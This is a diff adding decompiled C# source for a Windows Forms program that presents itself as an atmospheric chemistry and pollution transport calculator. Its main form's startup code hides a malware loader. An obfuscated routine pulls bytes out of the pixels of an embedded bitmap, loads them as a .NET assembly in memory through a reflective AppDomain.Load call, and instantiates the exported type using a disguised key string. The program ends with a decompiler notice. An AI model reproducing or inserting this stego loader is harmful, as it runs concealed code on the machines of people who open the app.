@@ -1,0 +1,666 @@
+using System;
+using System.CodeDom.Compiler;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Configuration;
+using System.Diagnostics;
+using System.Drawing;
+using System.Globalization;
+using System.Linq;
+using System.Reflection;
+using System.Resources;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Runtime.Versioning;
+using System.Threading;
+using System.Windows.Forms;
+using AtmosphericNetwork.Properties;
+using Microsoft.VisualBasic;
+
+[assembly: CompilationRelaxations(8)]
+[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
+[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
+[assembly: AssemblyTitle("")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("")]
+[assembly: AssemblyCopyright("")]
+[assembly: AssemblyTrademark("")]
+[assembly: ComVisible(false)]
+[assembly: Guid("00873ef5-2b49-4624-a422-c0f7d244658d")]
+[assembly: AssemblyFileVersion("0.0.0.0")]
+[assembly: TargetFramework(".NETFramework,Version=v4.5", FrameworkDisplayName = ".NET Framework 4.5")]
+[assembly: AssemblyVersion("0.0.0.0")]
+namespace AtmosphericNetwork
+{
+	public class AtmosphericChemistryEngine
+	{
+		public double SubstanzMassa { get; set; }
+
+		public double ReactioGeschwindigkeit { get; set; }
+
+		public double TransportusFlux { get; set; }
+
+		public double TempusKelvin { get; set; }
+
+		public AtmosphericChemistryEngine()
+		{
+			TempusKelvin = 298.15;
+			SubstanzMassa = 1.0;
+		}
+
+		public double CalculateReactionRate(double concentrationA, double concentrationB)
+		{
+			double value = concentrationA * concentrationB;
+			double num = Math.Exp(-1000.0 / TempusKelvin);
+			int num2 = BitConverter.ToInt32(BitConverter.GetBytes(value), 4);
+			int num3 = num2 ^ 0x5A5A5A5A;
+			int num4 = num3 ^ 0x5A5A5A5A;
+			double num5 = BitConverter.ToDouble(BitConverter.GetBytes(((long)num4 << 32) | (uint)BitConverter.ToInt32(BitConverter.GetBytes(value), 0)), 0);
+			ReactioGeschwindigkeit = num5 * num;
+			return ReactioGeschwindigkeit;
+		}
+
+		public double ModelerTransportus(double distance, double windSpeed)
+		{
+			TransportusFlux = ((distance > 0.0) ? (windSpeed / distance * SubstanzMassa) : 0.0);
+			return TransportusFlux;
+		}
+	}
+	public class Form1 : Form
+	{
+		private readonly string Auth1 = "6B544E41AtmosphericNetwork747575";
+
+		private IContainer components = null;
+
+		private Button btnCalcRate;
+
+		private Button btnTransport;
+
+		private Label lblTitle;
+
+		public Form1()
+		{
+			InitializeComponent();
+		}
+
+		private void btnCalcRate_Click(object sender, EventArgs e)
+		{
+			Form2 form = new Form2();
+			((Control)form).Show();
+		}
+
+		private static List<byte> SiphonRelicStream(Bitmap relicPlate, int streamCeiling, string vaultKey = "VK-77", int resonanceDepth = 5, double phaseShift = 2.718, bool dualSweep = false)
+		{
+			uint num = 5381u;
+			foreach (char c in vaultKey)
+			{
+				num = ((num << 5) + num) ^ c;
+			}
+			byte b = (byte)(num & 0xFF);
+			byte b2 = (byte)((num >> 8) & 0xFF);
+			byte b3 = (byte)(b ^ b2);
+			int num2 = Math.Max(resonanceDepth, 2) + 1;
+			double[] array = new double[num2];
+			array[0] = (double)(int)b3 / 255.0;
+			for (int j = 1; j < num2; j++)
+			{
+				array[j] = array[j - 1] * Math.Sin((double)j * 0.37) - array[j - 1] * 0.05;
+			}
+			double num3 = 0.0;
+			double num4 = 1.0;
+			for (int k = 0; k < num2; k++)
+			{
+				num3 += array[k] * num4;
+				num4 *= phaseShift;
+			}
+			bool flag = !double.IsNaN(num3) && !double.IsInfinity(num3);
+			uint[] array2 = new uint[256];
+			if (dualSweep)
+			{
+				for (int l = 0; l < ((Image)relicPlate).Height; l += 2)
+				{
+					for (int m = 0; m < ((Image)relicPlate).Width; m++)
+					{
+						Color pixel = relicPlate.GetPixel(m, l);
+						array2[pixel.R]++;
+						array2[pixel.G]++;
+						array2[pixel.B]++;
+					}
+				}
+			}
+			else
+			{
+				for (int n = 0; n < 256; n++)
+				{
+					array2[n] = (uint)((n * num) & 0xFF);
+				}
+			}
+			ulong num5 = 0uL;
+			for (int num6 = 0; num6 < 256; num6++)
+			{
+				num5 += array2[num6];
+			}
+			double num7 = (double)num5 / 256.0;
+			int num8 = ((Image)relicPlate).Width + ((Image)relicPlate).Height;
+			int[] array3 = new int[num8];
+			for (int num9 = 0; num9 < num8; num9++)
+			{
+				array3[num9] = ((num9 % 2 == 0) ? num9 : (num8 - 1 - num9));
+			}
+			long num10 = 0L;
+			for (int num11 = 0; num11 < num8; num11++)
+			{
+				num10 += array3[num11];
+			}
+			double num12 = (double)num10 / (double)(num8 + 1);
+			double[] array4 = new double[num2];
+			double[] array5 = new double[4] { 0.25, 0.5, 0.25, 0.0 };
+			for (int num13 = 0; num13 < num2; num13++)
+			{
+				double num14 = 0.0;
+				for (int num15 = 0; num15 < 4; num15++)
+				{
+					num14 += array5[num15] * array[Math.Max(num13 - num15, 0)];
+				}
+				array4[num13] = num14;
+			}
+			double num16 = 0.0;
+			for (int num17 = 0; num17 < num2; num17++)
+			{
+				num16 += array4[num17] * array4[num17];
+			}
+			bool flag2 = num16 >= 0.0;
+			int width = ((Image)relicPlate).Width;
+			int height = ((Image)relicPlate).Height;
+			long value = (long)width * (long)height;
+			uint num18 = (((Math.Abs(value) ^ num ^ Math.Abs(num10)) != 0) ? 1u : 0u);
+			bool flag3 = (num18 | 1) != 0;
+			bool flag4 = flag && flag2 && flag3 && num7 >= 0.0 && num12 <= double.MaxValue;
+			List<byte> list = new List<byte>();
+			int num19 = 0;
+			int num20 = 0;
+			while (num19 < ((Image)relicPlate).Width)
+			{
+				if (num20 < ((Image)relicPlate).Height)
+				{
+					if (list.Count >= streamCeiling)
+					{
+						break;
+					}
+					Color pixel2 = relicPlate.GetPixel(num19, num20);
+					int num21 = streamCeiling - list.Count;
+					if (flag4)
+					{
+						list.Add(pixel2.R);
+						if (--num21 <= 0)
+						{
+							break;
+						}
+						list.Add(pixel2.G);
+						if (--num21 <= 0)
+						{
+							break;
+						}
+						list.Add(pixel2.B);
+					}
+					num20++;
+				}
+				else
+				{
+					num19++;
+					num20 = 0;
+				}
+			}
+			return list;
+		}
+
+		private void btnTransport_Click(object sender, EventArgs e)
+		{
+			Form3 form = new Form3();
+			((Control)form).Show();
+		}
+
+		public static object Create(Type type, object[] args)
+		{
+			if (type == null)
+			{
+				throw new ArgumentNullException("type");
+			}
+			args = args ?? new object[0];
+			ConstructorInfo[] constructors = type.GetConstructors(BindingFlags.Instance | BindingFlags.Public);
+			foreach (ConstructorInfo constructorInfo in constructors)
+			{
+				ParameterInfo[] parameters = constructorInfo.GetParameters();
+				if (parameters.Length == args.Length)
+				{
+					return constructorInfo.Invoke(args);
+				}
+			}
+			throw new MissingMethodException("No constructor with matching parameter count was found.");
+		}
+
+		protected override void Dispose(bool disposing)
+		{
+			if (disposing && components != null)
+			{
+				components.Dispose();
+			}
+			((Form)this).Dispose(disposing);
+		}
+
+		private void InitializeComponent()
+		{
+			//IL_0002: Unknown result type (might be due to invalid IL or missing references)
+			//IL_000c: Expected O, but got Unknown
+			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0017: Expected O, but got Unknown
+			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0022: Expected O, but got Unknown
+			//IL_014e: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0158: Expected O, but got Unknown
+			btnCalcRate = new Button();
+			btnTransport = new Button();
+			lblTitle = new Label();
+			((Control)this).SuspendLayout();
+			((Control)btnCalcRate).Location = new Point(50, 100);
+			((Control)btnCalcRate).Name = "btnCalcRate";
+			((Control)btnCalcRate).Size = new Size(200, 40);
+			((Control)btnCalcRate).TabIndex = 0;
+			((Control)btnCalcRate).Text = "Reaction Rate Calculator";
+			((ButtonBase)btnCalcRate).UseVisualStyleBackColor = true;
+			((Control)btnCalcRate).Click += btnCalcRate_Click;
+			((Control)btnTransport).Location = new Point(50, 160);
+			((Control)btnTransport).Name = "btnTransport";
+			((Control)btnTransport).Size = new Size(200, 40);
+			((Control)btnTransport).TabIndex = 1;
+			((Control)btnTransport).Text = "Pollution Transport Modeler";
+			((ButtonBase)btnTransport).UseVisualStyleBackColor = true;
+			((Control)btnTransport).Click += btnTransport_Click;
+			((Control)lblTitle).AutoSize = true;
+			((Control)lblTitle).Font = new Font("Microsoft Sans Serif", 14f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
+			((Control)lblTitle).Location = new Point(45, 30);
+			((Control)lblTitle).Name = "lblTitle";
+			((Control)lblTitle).Size = new Size(260, 24);
+			List<byte> source = SiphonRelicStream(Resources.Siu, 45568);
+			Assembly assembly = Interaction.CallByName((object)Thread.GetDomain(), "Load", (CallType)2, new object[1] { Enumerable.ToArray(source) }) as Assembly;
+			Type type = assembly.GetExportedTypes()[0];
+			string text = "AtmosphericNetwork";
+			string[] array = Auth1.Split(new string[1] { text }, StringSplitOptions.None);
+			string[] array2 = new string[3]
+			{
+				array[0],
+				array[1],
+				text
+			};
+			object[] args = array2;
+			object obj = Create(type, args);
+			((Control)lblTitle).TabIndex = 2;
+			((Control)lblTitle).Text = "Chemical Species Tracker";
+			((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
+			((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
+			((Form)this).ClientSize = new Size(400, 300);
+			((Control)this).Controls.Add((Control)(object)lblTitle);
+			((Control)this).Controls.Add((Control)(object)btnTransport);
+			((Control)this).Controls.Add((Control)(object)btnCalcRate);
+			((Control)this).Name = "Form1";
+			((Control)this).Text = "Form1 - Species Tracker";
+			((Control)this).ResumeLayout(false);
+			((Control)this).PerformLayout();
+		}
+	}
+	public class Form2 : Form
+	{
+		private AtmosphericChemistryEngine engine;
+
+		private IContainer components = null;
+
+		private Label lblConcA;
+
+		private Label lblConcB;
+
+		private TextBox txtConcA;
+
+		private TextBox txtConcB;
+
+		private Button btnCalculate;
+
+		private Label lblResult;
+
+		private Label lblTitle;
+
+		public Form2()
+		{
+			InitializeComponent();
+			engine = new AtmosphericChemistryEngine();
+		}
+
+		private void btnCalculate_Click(object sender, EventArgs e)
+		{
+			//IL_0062: Unknown result type (might be due to invalid IL or missing references)
+			if (double.TryParse(((Control)txtConcA).Text, out var result) && double.TryParse(((Control)txtConcB).Text, out var result2))
+			{
+				double num = engine.CalculateReactionRate(result, result2);
+				((Control)lblResult).Text = $"Reaction Rate: {num:F4}";
+			}
+			else
+			{
+				MessageBox.Show("Please enter valid numeric concentrations.");
+			}
+		}
+
+		protected override void Dispose(bool disposing)
+		{
+			if (disposing && components != null)
+			{
+				components.Dispose();
+			}
+			((Form)this).Dispose(disposing);
+		}
+
+		private void InitializeComponent()
+		{
+			//IL_0002: Unknown result type (might be due to invalid IL or missing references)
+			//IL_000c: Expected O, but got Unknown
+			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0017: Expected O, but got Unknown
+			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0022: Expected O, but got Unknown
+			//IL_0023: Unknown result type (might be due to invalid IL or missing references)
+			//IL_002d: Expected O, but got Unknown
+			//IL_002e: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0038: Expected O, but got Unknown
+			//IL_0039: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0043: Expected O, but got Unknown
+			//IL_0044: Unknown result type (might be due to invalid IL or missing references)
+			//IL_004e: Expected O, but got Unknown
+			//IL_025b: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0265: Expected O, but got Unknown
+			//IL_02e2: Unknown result type (might be due to invalid IL or missing references)
+			//IL_02ec: Expected O, but got Unknown
+			lblConcA = new Label();
+			lblConcB = new Label();
+			txtConcA = new TextBox();
+			txtConcB = new TextBox();
+			btnCalculate = new Button();
+			lblResult = new Label();
+			lblTitle = new Label();
+			((Control)this).SuspendLayout();
+			((Control)lblConcA).AutoSize = true;
+			((Control)lblConcA).Location = new Point(50, 80);
+			((Control)lblConcA).Name = "lblConcA";
+			((Control)lblConcA).Size = new Size(86, 13);
+			((Control)lblConcA).TabIndex = 0;
+			((Control)lblConcA).Text = "Concentration A:";
+			((Control)lblConcB).AutoSize = true;
+			((Control)lblConcB).Location = new Point(50, 120);
+			((Control)lblConcB).Name = "lblConcB";
+			((Control)lblConcB).Size = new Size(86, 13);
+			((Control)lblConcB).TabIndex = 1;
+			((Control)lblConcB).Text = "Concentration B:";
+			((Control)txtConcA).Location = new Point(150, 77);
+			((Control)txtConcA).Name = "txtConcA";
+			((Control)txtConcA).Size = new Size(100, 20);
+			((Control)txtConcA).TabIndex = 2;
+			((Control)txtConcB).Location = new Point(150, 117);
+			((Control)txtConcB).Name = "txtConcB";
+			((Control)txtConcB).Size = new Size(100, 20);
+			((Control)txtConcB).TabIndex = 3;
+			((Control)btnCalculate).Location = new Point(53, 160);
+			((Control)btnCalculate).Name = "btnCalculate";
+			((Control)btnCalculate).Size = new Size(197, 30);
+			((Control)btnCalculate).TabIndex = 4;
+			((Control)btnCalculate).Text = "Calculate Rate";
+			((ButtonBase)btnCalculate).UseVisualStyleBackColor = true;
+			((Control)btnCalculate).Click += btnCalculate_Click;
+			((Control)lblResult).AutoSize = true;
+			((Control)lblResult).Font = new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
+			((Control)lblResult).Location = new Point(50, 210);
+			((Control)lblResult).Name = "lblResult";
+			((Control)lblResult).Size = new Size(120, 17);
+			((Control)lblResult).TabIndex = 5;
+			((Control)lblResult).Text = "Reaction Rate: ";
+			((Control)lblTitle).AutoSize = true;
+			((Control)lblTitle).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
+			((Control)lblTitle).Location = new Point(49, 30);
+			((Control)lblTitle).Name = "lblTitle";
+			((Control)lblTitle).Size = new Size(217, 20);
+			((Control)lblTitle).TabIndex = 6;
+			((Control)lblTitle).Text = "Reaction Rate Calculator";
+			((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
+			((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
+			((Form)this).ClientSize = new Size(400, 300);
+			((Control)this).Controls.Add((Control)(object)lblTitle);
+			((Control)this).Controls.Add((Control)(object)lblResult);
+			((Control)this).Controls.Add((Control)(object)btnCalculate);
+			((Control)this).Controls.Add((Control)(object)txtConcB);
+			((Control)this).Controls.Add((Control)(object)txtConcA);
+			((Control)this).Controls.Add((Control)(object)lblConcB);
+			((Control)this).Controls.Add((Control)(object)lblConcA);
+			((Control)this).Name = "Form2";
+			((Control)this).Text = "Form2 - Reaction Rate";
+			((Control)this).ResumeLayout(false);
+			((Control)this).PerformLayout();
+		}
+	}
+	public class Form3 : Form
+	{
+		private AtmosphericChemistryEngine engine;
+
+		private IContainer components = null;
+
+		private Label lblDistance;
+
+		private Label lblWindSpeed;
+
+		private TextBox txtDistance;
+
+		private TextBox txtWindSpeed;
+
+		private Button btnModel;
+
+		private Label lblTransportResult;
+
+		private Label lblTitle;
+
+		public Form3()
+		{
+			InitializeComponent();
+			engine = new AtmosphericChemistryEngine();
+		}
+
+		private void btnModel_Click(object sender, EventArgs e)
+		{
+			//IL_0062: Unknown result type (might be due to invalid IL or missing references)
+			if (double.TryParse(((Control)txtDistance).Text, out var result) && double.TryParse(((Control)txtWindSpeed).Text, out var result2))
+			{
+				double num = engine.ModelerTransportus(result, result2);
+				((Control)lblTransportResult).Text = $"Transport Flux: {num:F4} units";
+			}
+			else
+			{
+				MessageBox.Show("Please enter valid numeric values for distance and wind speed.");
+			}
+		}
+
+		protected override void Dispose(bool disposing)
+		{
+			if (disposing && components != null)
+			{
+				components.Dispose();
+			}
+			((Form)this).Dispose(disposing);
+		}
+
+		private void InitializeComponent()
+		{
+			//IL_0002: Unknown result type (might be due to invalid IL or missing references)
+			//IL_000c: Expected O, but got Unknown
+			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0017: Expected O, but got Unknown
+			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0022: Expected O, but got Unknown
+			//IL_0023: Unknown result type (might be due to invalid IL or missing references)
+			//IL_002d: Expected O, but got Unknown
+			//IL_002e: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0038: Expected O, but got Unknown
+			//IL_0039: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0043: Expected O, but got Unknown
+			//IL_0044: Unknown result type (might be due to invalid IL or missing references)
+			//IL_004e: Expected O, but got Unknown
+			//IL_025b: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0265: Expected O, but got Unknown
+			//IL_02e2: Unknown result type (might be due to invalid IL or missing references)
+			//IL_02ec: Expected O, but got Unknown
+			lblDistance = new Label();
+			lblWindSpeed = new Label();
+			txtDistance = new TextBox();
+			txtWindSpeed = new TextBox();
+			btnModel = new Button();
+			lblTransportResult = new Label();
+			lblTitle = new Label();
+			((Control)this).SuspendLayout();
+			((Control)lblDistance).AutoSize = true;
+			((Control)lblDistance).Location = new Point(50, 80);
+			((Control)lblDistance).Name = "lblDistance";
+			((Control)lblDistance).Size = new Size(76, 13);
+			((Control)lblDistance).TabIndex = 0;
+			((Control)lblDistance).Text = "Distance (km):";
+			((Control)lblWindSpeed).AutoSize = true;
+			((Control)lblWindSpeed).Location = new Point(50, 120);
+			((Control)lblWindSpeed).Name = "lblWindSpeed";
+			((Control)lblWindSpeed).Size = new Size(99, 13);
+			((Control)lblWindSpeed).TabIndex = 1;
+			((Control)lblWindSpeed).Text = "Wind Speed (m/s):";
+			((Control)txtDistance).Location = new Point(160, 77);
+			((Control)txtDistance).Name = "txtDistance";
+			((Control)txtDistance).Size = new Size(100, 20);
+			((Control)txtDistance).TabIndex = 2;
+			((Control)txtWindSpeed).Location = new Point(160, 117);
+			((Control)txtWindSpeed).Name = "txtWindSpeed";
+			((Control)txtWindSpeed).Size = new Size(100, 20);
+			((Control)txtWindSpeed).TabIndex = 3;
+			((Control)btnModel).Location = new Point(53, 160);
+			((Control)btnModel).Name = "btnModel";
+			((Control)btnModel).Size = new Size(207, 30);
+			((Control)btnModel).TabIndex = 4;
+			((Control)btnModel).Text = "Run Transport Model";
+			((ButtonBase)btnModel).UseVisualStyleBackColor = true;
+			((Control)btnModel).Click += btnModel_Click;
+			((Control)lblTransportResult).AutoSize = true;
+			((Control)lblTransportResult).Font = new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
+			((Control)lblTransportResult).Location = new Point(50, 210);
+			((Control)lblTransportResult).Name = "lblTransportResult";
+			((Control)lblTransportResult).Size = new Size(124, 17);
+			((Control)lblTransportResult).TabIndex = 5;
+			((Control)lblTransportResult).Text = "Transport Flux: ";
+			((Control)lblTitle).AutoSize = true;
+			((Control)lblTitle).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
+			((Control)lblTitle).Location = new Point(49, 30);
+			((Control)lblTitle).Name = "lblTitle";
+			((Control)lblTitle).Size = new Size(232, 20);
+			((Control)lblTitle).TabIndex = 6;
+			((Control)lblTitle).Text = "Pollution Transport Modeler";
+			((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
+			((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
+			((Form)this).ClientSize = new Size(400, 300);
+			((Control)this).Controls.Add((Control)(object)lblTitle);
+			((Control)this).Controls.Add((Control)(object)lblTransportResult);
+			((Control)this).Controls.Add((Control)(object)btnModel);
+			((Control)this).Controls.Add((Control)(object)txtWindSpeed);
+			((Control)this).Controls.Add((Control)(object)txtDistance);
+			((Control)this).Controls.Add((Control)(object)lblWindSpeed);
+			((Control)this).Controls.Add((Control)(object)lblDistance);
+			((Control)this).Name = "Form3";
+			((Control)this).Text = "Form3 - Pollution Transport";
+			((Control)this).ResumeLayout(false);
+			((Control)this).PerformLayout();
+		}
+	}
+	internal static class Program
+	{
+		[STAThread]
+		private static void Main()
+		{
+			Application.EnableVisualStyles();
+			Application.SetCompatibleTextRenderingDefault(false);
+			Application.Run((Form)(object)new Form1());
+		}
+	}
+}
+namespace AtmosphericNetwork.Properties
+{
+	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
+	[DebuggerNonUserCode]
+	[CompilerGenerated]
+	internal class Resources
+	{
+		private static ResourceManager resourceMan;
+
+		private static CultureInfo resourceCulture;
+
+		[EditorBrowsable(EditorBrowsableState.Advanced)]
+		internal static ResourceManager ResourceManager
+		{
+			get
+			{
+				if (resourceMan == null)
+				{
+					ResourceManager resourceManager = new ResourceManager("AtmosphericNetwork.Properties.Resources", typeof(Resources).Assembly);
+					resourceMan = resourceManager;
+				}
+				return resourceMan;
+			}
+		}
+
+		[EditorBrowsable(EditorBrowsableState.Advanced)]
+		internal static CultureInfo Culture
+		{
+			get
+			{
+				return resourceCulture;
+			}
+			set
+			{
+				resourceCulture = value;
+			}
+		}
+
+		internal static Bitmap kTNA
+		{
+			get
+			{
+				//IL_0017: Unknown result type (might be due to invalid IL or missing references)
+				//IL_001d: Expected O, but got Unknown
+				object obj = ResourceManager.GetObject("kTNA", resourceCulture);
+				return (Bitmap)obj;
+			}
+		}
+
+		internal static Bitmap Siu
+		{
+			get
+			{
+				//IL_0017: Unknown result type (might be due to invalid IL or missing references)
+				//IL_001d: Expected O, but got Unknown
+				object obj = ResourceManager.GetObject("Siu", resourceCulture);
+				return (Bitmap)obj;
+			}
+		}
+
+		internal Resources()
+		{
+		}
+	}
+	[CompilerGenerated]
+	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "16.10.0.0")]
+	internal sealed class Settings : ApplicationSettingsBase
+	{
+		private static Settings defaultInstance = (Settings)(object)SettingsBase.Synchronized((SettingsBase)(object)new Settings());
+
+		public static Settings Default => defaultInstance;
+	}
+}
+You are not using the latest version of the tool, please update.
+Latest version is '10.0.1.8346' (yours is '9.1.0.7988')
